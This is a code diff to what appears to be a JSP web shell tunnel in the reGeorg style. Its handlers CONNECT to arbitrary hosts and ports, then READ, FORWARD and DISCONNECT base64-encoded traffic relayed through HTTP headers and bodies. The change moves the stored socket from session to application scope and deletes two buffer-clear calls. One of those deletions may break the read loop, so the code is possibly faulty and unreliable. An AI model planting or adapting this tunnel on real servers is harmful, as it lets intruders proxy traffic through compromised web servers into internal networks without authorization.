@@ -196,21 +196,21 @@
                 SocketChannel socketChannel = SocketChannel.open();
                 socketChannel.connect(new InetSocketAddress(target, port));
                 socketChannel.configureBlocking(false);
-                session.setAttribute(mark, socketChannel);
+                application.setAttribute(mark, socketChannel);
                 response.setHeader("X-STATUS", "OK");
             } catch (Exception e) {
                 response.setHeader("X-ERROR", "Failed connecting to target");
                 response.setHeader("X-STATUS", "FAIL");
             }
         } else if (cmd.compareTo("DISCONNECT") == 0) {
-            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
+            SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
             try{
                 socketChannel.socket().close();
             } catch (Exception e) {
             }
-            session.removeAttribute(mark);
+            application.removeAttribute(mark);
         } else if (cmd.compareTo("READ") == 0){
-            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
+            SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
             try{
                 ByteBuffer buf = ByteBuffer.allocate(513);
                 int bytesRead = socketChannel.read(buf);
@@ -218,7 +218,6 @@
                     byte[] data = new byte[bytesRead];
                     System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                     out.write(b64en(data));
-                    buf.clear();
                     bytesRead = socketChannel.read(buf);
                 }
                 response.setHeader("X-STATUS", "OK");
@@ -228,7 +227,7 @@
             }
 
         } else if (cmd.compareTo("FORWARD") == 0){
-            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
+            SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
             try {
 
                 int readlen = request.getContentLength();
@@ -237,7 +236,6 @@
                 request.getInputStream().read(buff, 0, readlen);
                 byte[] base64 = b64de(new String(buff));
                 ByteBuffer buf = ByteBuffer.allocate(base64.length);
-                buf.clear();
                 buf.put(base64);
                 buf.flip();
 
